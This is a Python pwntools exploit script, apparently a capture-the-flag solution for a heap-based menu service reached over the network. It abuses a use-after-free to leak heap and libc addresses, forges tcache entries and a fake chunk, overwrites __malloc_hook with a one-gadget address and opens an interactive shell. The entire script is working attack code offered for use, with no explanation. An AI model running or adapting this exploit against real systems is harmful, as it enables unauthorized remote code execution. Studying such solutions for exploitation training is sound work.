#!/usr/bin/env python3

from pwn import *
import sys

one_shots = [0xe6b93, 0xe6b96, 0xe6b99, 0x10af39]

IP = sys.argv[1]
PORT = 17103
libc = ELF("./libc.so.6")
r = remote(IP, PORT)

def add_chunk(age, size, data):
    r.sendline(b"1")
    r.recvuntil(": ")

    r.sendline(str(age).encode())
    r.recvuntil(": ")

    r.sendline(str(size).encode())
    r.recvuntil(": ")

    r.send(data)
    r.recvuntil("> ")

def rename_chunk(idx, size, data):
    r.sendline(b"2")
    r.recvuntil(": ")

    r.sendline(str(idx).encode())
    r.recvuntil(": ")

    r.sendline(str(size).encode())
    r.recvuntil(": ")

    r.send(data)
    r.recvuntil("> ")

def delete_chunk(idx):
    r.sendline(b"3")
    r.recvuntil(": ")

    r.sendline(str(idx).encode())
    r.recvuntil("> ")

def view_chunk(idx):
    r.sendline(b"4")
    r.recvuntil(": ")

    r.sendline(str(idx).encode())
    data = b''

    for _ in range(3):
        data += r.recvline()

    r.recvuntil(b"> ")
    return data

# SPLOIT #
# make leak 
add_chunk(0, 0x30, b"aaaa") # 0
add_chunk(1, 0x20, b"aaaa") # 1
add_chunk(2, 0x30, b"aaaa") # 2
    
# leak heap
delete_chunk(0)
delete_chunk(2)
data = view_chunk(2)
heap_leak = int(data.strip().split(b'Number: ')[1], 10)

for i in range(4):
    add_chunk(i + 3, 0x10, b"data")
for i in range(4):
    delete_chunk(i + 3)

delete_chunk(1)
rename_chunk(1, 0x20, p64(heap_leak + 0x1e0))
add_chunk(7, 0x40, p64(0) + p64(0x91))
add_chunk(8, 0x40, p64(0x6161616161616161) * 8)
add_chunk(9, 0x40, p64(0) + p64(0x21) + p64(0x0) + p64(0x21))

print("[+] heap fake chunk:", hex(heap_leak + 0x1e0))

fake_tcache_entry = p16(0x0) + p16(0x2) + p16(0x2) + p16(0x1) + p16(0x0) + p16(0x1) + p16(0x0) + p16(0x7)
rename_chunk(0, 0x30, fake_tcache_entry)

add_chunk(10, 0x20, p16(0x6)) # get chunk from tcache 0x30
add_chunk(11, 0x20, "fake_chunk") # get fake chunk

rename_chunk(0, 0x30, p16(0x7)) # overwrite tcache 0x20
delete_chunk(11) # free fake chunk, and he stored in unsorted bin

data = view_chunk(11).strip().split(b'Name: ')[1][:6].ljust(8, b'\x00')

leak = u64(data)
base = leak - 0x1eabe0

print("[+] libc leak:", hex(leak))
print("[+] libc base:", hex(base))
delete_chunk(8)
rename_chunk(8, 0x40, p64(base + libc.symbols['__malloc_hook'] - 0x3))

add_chunk(12, 0x40, b'pek')
add_chunk(13, 0x40, b'\x00' * 3 + p64(base + one_shots[3]))

r.sendline(b"1")

r.interactive()
